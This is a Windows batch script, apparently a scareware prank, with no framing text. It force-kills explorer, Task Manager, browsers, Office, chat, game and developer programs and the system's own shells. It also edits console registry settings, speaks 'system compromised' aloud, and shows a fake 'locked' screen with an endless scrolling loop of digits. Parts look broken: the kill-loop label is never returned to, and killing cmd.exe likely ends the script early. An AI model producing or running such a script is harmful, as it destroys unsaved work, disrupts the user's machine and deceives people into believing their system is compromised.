@echo off
title locked
color 0c
reg add HKCU\Console /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add HKCU\Console /v InsertMode /t REG_DWORD /d 1 /f >nul 2>&1
cls
echo [*] killing processes...
timeout /t 1 /nobreak >nul
powershell -c "Add-Type -AssemblyName System.Speech; $speak=New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak('system compromised.')" >nul 2>&1
powershell -c "[System.Console]::Beep(800,300)" >nul 2>&1
powershell -c "[System.Console]::Beep(1200,500)" >nul 2>&1

:killloop
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im write.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
taskkill /f /im steam.exe >nul 2>&1
taskkill /f /im steamwebhelper.exe >nul 2>&1
taskkill /f /im Spotify.exe >nul 2>&1
taskkill /f /im Code.exe >nul 2>&1
taskkill /f /im devenv.exe >nul 2>&1
taskkill /f /im git-bash.exe >nul 2>&1
taskkill /f /im VBoxSVC.exe >nul 2>&1
taskkill /f /im VirtualBox.exe >nul 2>&1
taskkill /f /im taskhost.exe >nul 2>&1
taskkill /f /im dwm.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
taskkill /f /im powershell.exe >nul 2>&1
cls
echo.
echo    [ locked ]
echo    [ code: h4x0r ]
echo.
:matrix
color 0a
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
ping 127.0.0.1 -n 1 >nul
goto matrix
